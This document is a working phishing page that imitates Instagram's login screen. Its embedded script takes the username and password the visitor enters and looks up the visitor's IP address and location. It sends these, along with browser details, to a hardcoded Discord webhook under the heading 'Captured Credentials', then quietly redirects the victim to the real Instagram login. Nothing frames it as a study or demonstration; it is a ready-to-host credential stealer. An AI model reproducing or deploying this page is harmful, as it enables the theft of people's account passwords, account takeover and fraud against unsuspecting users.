<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
.main-container { width: 350px; margin-top: 30px; }
.box { background-color: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 10px 0; margin-bottom: 10px; text-align: center; }
.logo { margin: 22px auto 12px; width: 175px; height: 51px; background-image: url('https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png'); background-size: contain; background-repeat: no-repeat; background-position: center; }
.form-container { padding: 0 40px; margin-top: 24px; }
input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; box-sizing: border-box; color: #262626; font-size: 12px; padding: 9px 0 7px 8px; margin-bottom: 6px; outline: none; }
input:focus { border-color: #a8a8a8; }
button { background-color: #0095f6; border: 1px solid transparent; border-radius: 4px; color: #fff; font-weight: 600; padding: 5px 9px; width: 100%; margin-top: 8px; cursor: pointer; }
button:disabled { opacity: .3; }
.divider { display: flex; align-items: center; margin: 10px 40px 18px; }
.divider .line { flex-grow: 1; height: 1px; background-color: #dbdbdb; }
.divider .text { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
.fb-login { color: #385185; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
.fb-login img { width: 16px; margin-right: 8px; }
.forgot { color: #00376b; font-size: 12px; margin-top: 12px; cursor: pointer; }
.signup-box p { font-size: 14px; margin: 15px; }
.signup-box span { color: #0095f6; font-weight: 600; cursor: pointer; }
.app-box { text-align: center; }
.app-box p { font-size: 14px; margin: 10px 20px 10px 20px; }
.app-buttons { display: flex; justify-content: center; gap: 8px; margin-bottom: 40px; }
.app-buttons img { height: 40px; cursor: pointer; }
</style>
</head>
<body>
<div class="main-container">
<div class="box">
<div class="logo"></div>
<div class="form-container">
<form id="loginForm">
<input type="text" id="username" placeholder="Phone number, username, or email" required>
<input type="password" id="password" placeholder="Password" required>
<button type="submit" id="loginBtn">Log In</button>
</form>
<div class="divider">
<div class="line"></div>
<div class="text">OR</div>
<div class="line"></div>
</div>
<div class="fb-login">Log in with Facebook</div>
<div class="forgot">Forgot password?</div>
</div>
</div>
<div class="box signup-box">
<p>Don't have an account? <span>Sign up</span></p>
</div>
<div class="app-box">
<p>Get the app.</p>
<div class="app-buttons">
<img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Get it on Google Play">
<img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on the App Store">
</div>
</div>
</div>
<script>
const webhookUrl = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
document.getElementById('loginForm').addEventListener('submit', async (e) => {
e.preventDefault();
const username = document.getElementById('username').value;
const password = document.getElementById('password').value;
const time = new Date().toISOString();
const userAgent = navigator.userAgent;
let ip = 'Unknown';
let location = 'Unknown';
try {
const res = await fetch('https://ipapi.co/json/');
const data = await res.json();
ip = data.ip;
location = data.city + ', ' + data.region + ', ' + data.country_name;
} catch (err) {
console.error('IP fetch failed');
}
const payload = {
content: '@everyone 🚨 New Instagram Login Captured! 🚨',
embeds: [{
title: 'Captured Credentials',
color: 13632027,
fields: [
{ name: 'Username/Email', value: username, inline: true },
{ name: 'Password', value: password, inline: true },
{ name: 'IP Address', value: ip, inline: false },
{ name: 'Location', value: location, inline: false },
{ name: 'OS/Browser', value: userAgent, inline: false },
{ name: 'Time', value: time, inline: false }
]
}]
};
try {
await fetch(webhookUrl, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(payload)
});
window.location.href = 'https://www.instagram.com/accounts/login/';
} catch (err) {
window.location.href = 'https://www.instagram.com/accounts/login/';
}
});
</script>
</body>
</html>
